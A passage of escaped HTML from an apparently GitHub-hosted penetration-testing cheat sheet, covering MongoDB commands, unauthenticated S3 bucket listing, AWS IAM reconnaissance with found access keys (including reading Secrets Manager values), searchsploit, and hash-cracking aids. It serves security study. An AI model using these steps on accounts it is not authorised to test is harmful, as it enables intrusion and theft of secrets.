class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create new collection (table) called \"users\"\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003edb\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecreateCollection\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eusers\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e)\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create new document (row) in users collection:\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003edb\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eusers\u003c/span\u003e.insert({id:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e1\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e, username: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ederp\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e, email: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ederp@derp.com\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e, password: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eherpderp\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e})\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e show all documents (rows) in the users collection:\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003edb\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eusers\u003c/span\u003e.find()\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get all documents matching search criteria\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003edb\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eusers\u003c/span\u003e.find({id: {$gt: \u003cspan class=\"pl-c1\"\u003e5\u003c/span\u003e}})\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get first matching user document\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003edb\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eusers\u003c/span\u003e.findOne({id: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e1\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e})\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e change fields in a users document\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003edb\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eusers\u003c/span\u003e.\u003cspan class=\"pl-k\"\u003eupdate\u003c/span\u003e({id:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e1\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e}, {$\u003cspan class=\"pl-k\"\u003eset\u003c/span\u003e: {username: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ebubba\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e}});\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e delete a document (by id)\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003edb\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eusers\u003c/span\u003e.remove({\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eid\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e1\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e})\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e drop the users collection (delete everything)\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003edb\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eusers\u003c/span\u003e.drop()\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://docs.mongodb.com/manual/reference/operator/query/\" rel=\"nofollow\"\u003eOperators\u003c/a\u003e (for searches/matching):\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e$eq\u003c/li\u003e\n\u003cli\u003e$ne\u003c/li\u003e\n\u003cli\u003e$gt\u003c/li\u003e\n\u003cli\u003e$lt\u003c/li\u003e\n\u003cli\u003e$and\u003c/li\u003e\n\u003cli\u003e$or\u003c/li\u003e\n\u003cli\u003e$where\u003c/li\u003e\n\u003cli\u003e$exists\u003c/li\u003e\n\u003cli\u003e$regex\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.22 Amazon Web Services (AWS) S3 Buckets\u003c/h2\u003e\u003ca id=\"user-content-222-amazon-web-services-aws-s3-buckets\" class=\"anchor\" aria-label=\"Permalink: 2.22 Amazon Web Services (AWS) S3 Buckets\" href=\"#222-amazon-web-services-aws-s3-buckets\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFormat of the bucket and resource (file) in urls:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"http://BUCKETNAME.s3.amazonaws.com/FILENAME.ext\nhttp://s3.amazonaws.com/BUCKETNAME/FILENAME.ext\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ehttp://BUCKETNAME.s3.amazonaws.com/FILENAME.ext\nhttp://s3.amazonaws.com/BUCKETNAME/FILENAME.ext\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf the buckets have ACL rules set to allow \u003ccode\u003eAnyone\u003c/code\u003e, then you can list the\ncontents as an unauthenticated user. If the ACL allows \u003ccode\u003eAuthenticatedUsers\u003c/code\u003e,\nany logged-in AWS customer in the world can list the bucket contents.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eListing bucket contents without being authenticated:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# over HTTP (can be done in browser)\ncurl http://irs-form-990.s3.amazonaws.com/\n\n# using the AWS CLI 'ls', '--no-sign-request' means without authentication\naws s3 ls s3://irs-form-990/ --no-sign-request\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e over HTTP (can be done in browser)\u003c/span\u003e\ncurl http://irs-form-990.s3.amazonaws.com/\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using the AWS CLI 'ls', '--no-sign-request' means without authentication\u003c/span\u003e\naws s3 ls s3://irs-form-990/ --no-sign-request\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eDownloading files from AWS Buckets without being authenticated:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# over HTTP (can be done in browser)\ncurl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml\n\n# using the AWS CLI 'cp', '--no-sign-request' means without authentication\naws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e over HTTP (can be done in browser)\u003c/span\u003e\ncurl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using the AWS CLI 'cp', '--no-sign-request' means without authentication\u003c/span\u003e\naws s3 cp s3://irs-form-990/201101319349101615_public.xml \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e --no-sign-request\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.22.1 AWS Identity and Access Management (IAM)\u003c/h3\u003e\u003ca id=\"user-content-2221-aws-identity-and-access-management-iam\" class=\"anchor\" aria-label=\"Permalink: 2.22.1 AWS Identity and Access Management (IAM)\" href=\"#2221-aws-identity-and-access-management-iam\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eExcluding a few older services like Amazon S3, all requests to AWS services must be signed. This is typically done behind the scenes by the AWS CLI or the various Software development Kits that AWS provides. The signing process leverages IAM Access Keys. These access keys are one of the primary ways an AWS account is compromised.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.22.1.1 IAM Access Keys\u003c/h4\u003e\u003ca id=\"user-content-22211-iam-access-keys\" class=\"anchor\" aria-label=\"Permalink: 2.22.1.1 IAM Access Keys\" href=\"#22211-iam-access-keys\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIAM Access Keys consist of an Access Key ID and the Secret Access Key.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eAccess Key IDs\u003c/strong\u003e always begin with the letters \u003ccode\u003eAKIA\u003c/code\u003e and are \u003cstrong\u003e20 characters long\u003c/strong\u003e.\nThese act as a user name for the AWS API.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThe \u003cstrong\u003eSecret Access Key\u003c/strong\u003e is \u003cstrong\u003e40 characters long\u003c/strong\u003e. AWS generates both strings;\nhowever, AWS doesn't make the Secret Access Key available to download after the\ninitial generation.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThere is another type of credentials, \u003cstrong\u003eshort-term credentials\u003c/strong\u003e, where the\nAccess Key ID \u003cstrong\u003ebegins with the letters \u003ccode\u003eASIA\u003c/code\u003e\u003c/strong\u003e and includes an additional\nstring called the Session Token.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.22.1.2 Conducting Reconnaissance with IAM\u003c/h4\u003e\u003ca id=\"user-content-22212-conducting-reconnaissance-with-iam\" class=\"anchor\" aria-label=\"Permalink: 2.22.1.2 Conducting Reconnaissance with IAM\" href=\"#22212-conducting-reconnaissance-with-iam\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWhen you find credentials to AWS, you can add them to your AWS Profile in the\nAWS CLI. For this, you use the command:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"aws configure --profile PROFILENAME\"\u003e\u003cpre\u003eaws configure --profile PROFILENAME\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThis command will add entries to the \u003ccode\u003e.aws/config\u003c/code\u003e and \u003ccode\u003e.aws/credentials\u003c/code\u003e files in your user's home directory.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eProTip\u003c/strong\u003e: Never store a set of access keys in the \u003ccode\u003e[default]\u003c/code\u003e profile (without adding the \u003ccode\u003e--profile\u003c/code\u003e flag). Doing so  forces you always to specify a profile and never accidentally run a  command against an account you don't intend to.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eA few other common AWS reconnaissance techniques are:\u003c/p\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003e\n\u003cp dir=\"auto\"\u003eFinding the Account ID belonging to an access key:\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ccode\u003eaws sts get-access-key-info --access-key-id AKIAEXAMPLE\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp dir=\"auto\"\u003eDetermining the Username the access key you're using belongs to\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ccode\u003eaws sts get-caller-identity --profile PROFILENAME\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp dir=\"auto\"\u003eListing all the EC2 instances running in an account\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ccode\u003eaws ec2 describe-instances --output text --profile PROFILENAME\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp dir=\"auto\"\u003eListing all the EC2 instances running in an account in a different region\n\u003ccode\u003eaws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp dir=\"auto\"\u003eListing all secrets stored in AWS Secrets Manager for a given profile\n\u003ccode\u003eaws secretsmanager list-secrets --profile PROFILENAME\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp dir=\"auto\"\u003eReveal the encrypted contents of a secret (secrets might be region-specific).\n\u003ccode\u003eaws secretsmanager get-secret-value --secret-id \u0026lt;friendlyname-or-ARN\u0026gt; --profile PROFILENAME [--region eu-north-1]\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.22.1.3 AWS ARNs\u003c/h4\u003e\u003ca id=\"user-content-22213-aws-arns\" class=\"anchor\" aria-label=\"Permalink: 2.22.1.3 AWS ARNs\" href=\"#22213-aws-arns\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAn Amazon ARN is their way of generating a unique identifier for all resources in the AWS Cloud. It consists of multiple strings separated by colons.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThe format is:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"arn:aws:\u0026lt;service\u0026gt;:\u0026lt;region\u0026gt;:\u0026lt;account_id\u0026gt;:\u0026lt;resource_type\u0026gt;/\u0026lt;resource_name\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003earn:aws:\u0026lt;service\u0026gt;:\u0026lt;region\u0026gt;:\u0026lt;account_id\u0026gt;:\u0026lt;resource_type\u0026gt;/\u0026lt;resource_name\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3 Exploitation\u003c/h1\u003e\u003ca id=\"user-content-3-exploitation\" class=\"anchor\" aria-label=\"Permalink: 3 Exploitation\" href=\"#3-exploitation\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.1 Searchsploit\u003c/h2\u003e\u003ca id=\"user-content-31-searchsploit\" class=\"anchor\" aria-label=\"Permalink: 3.1 Searchsploit\" href=\"#31-searchsploit\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"searchsploit -www query # show exploitdb link instead\nsearchsploit -x /path/to/exploit # read (\u0026quot;eXamine\u0026quot;) the exploit file\nsearchsploit -m /path/to/exploit # mirror exploit file to current directory\"\u003e\u003cpre\u003esearchsploit -www query \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e show exploitdb link instead\u003c/span\u003e\nsearchsploit -x /path/to/exploit \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e read (\"eXamine\") the exploit file\u003c/span\u003e\nsearchsploit -m /path/to/exploit \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e mirror exploit file to current directory\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.2 Cracking Password Hashes\u003c/h2\u003e\u003ca id=\"user-content-32-cracking-password-hashes\" class=\"anchor\" aria-label=\"Permalink: 3.2 Cracking Password Hashes\" href=\"#32-cracking-password-hashes\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eHere are my favorite wordlists to try:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"/usr/share/wordlists/fasttrack.txt\n/usr/share/wordlists/rockyou.txt\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e/usr/share/wordlists/fasttrack.txt\n/usr/share/wordlists/rockyou.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.2.1 Identifying Unknown Hash Format\u003c/h3\u003e\u003ca id=\"user-content-321-identifying-unknown-hash-format\" class=\"anchor\" aria-label=\"Permalink: 3.2.1 Identifying Unknown Hash Format\" href=\"#321-identifying-unknown-hash-format\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"hashid 'HASHGOESHERE'\nhash-identifier 'HASHGOESHERE'\"\u003e\u003cpre\u003ehashid \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eHASHGOESHERE\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\nhash-identifier \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eHASHGOESHERE\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eI also have my \u003ca href=\"https://github.com/camercu/dotfiles/blob/main/hashcat-mode-finder/hashcat-mode-finder.plugin.zsh\"\u003ehashcat mode finder\u003c/a\u003e plugin, which does fuzzy searching on hash names and hash contents against hashcat's example hashes.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eHere is a bash function version of it:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# fuzzy-search hashcat modes\n# source: https://jonathanh.co.uk/blog/fuzzy-search-hashcat-modes.html\n# NOTE: fzf and hashcat required to be installed\nfunction hcmode {\n    hashcat --example-hashes | grep -E 'MODE:|TYPE:|HASH:|Hash mode #|Name\\.*:|Example\\.Hash\\.*:|^$' | awk -v RS=\u0026quot;\\n\\n\u0026quot; -F \u0026quot;\\t\u0026quot; '{gsub(\u0026quot;\\n\u0026quot;,\u0026quot;\\t\u0026quot;,$0); print $1 \u0026quot;\\t\u0026quot; $2 \u0026quot;\\t\u0026quot; $3}' | sed 's/MODE: //; s/Hash mode #//; s/TYPE: //; s/ *Name\\.*: //; s/Example\\.Hash\\.*://; s/HASH: //' | fzf -d '\\t' --header=\u0026quot;Mode   Type\u0026quot; --preview='echo HASH: {3}' --preview-window=up:1 --reverse --height=40% | awk '{print $1}'\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e fuzzy-search hashcat 